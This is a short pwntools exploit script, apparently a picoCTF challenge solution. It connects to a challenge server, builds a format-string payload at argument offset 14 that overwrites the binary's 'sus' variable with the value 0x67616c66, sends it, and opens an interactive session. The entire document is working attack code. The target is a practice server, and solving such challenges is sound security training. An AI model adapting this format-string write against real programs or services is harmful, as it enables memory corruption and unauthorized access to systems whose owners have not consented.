from pwn import *

exe = ELF("./vuln")
context.binary = exe

r = remote("rhea.picoctf.net", 53881)
r.recvuntil("What do you have to say?\n")

writes = {exe.sym["sus"]:0x67616c66}
payload = fmtstr_payload(14, writes)
print(payload)

r.sendline(payload)

r.interactive()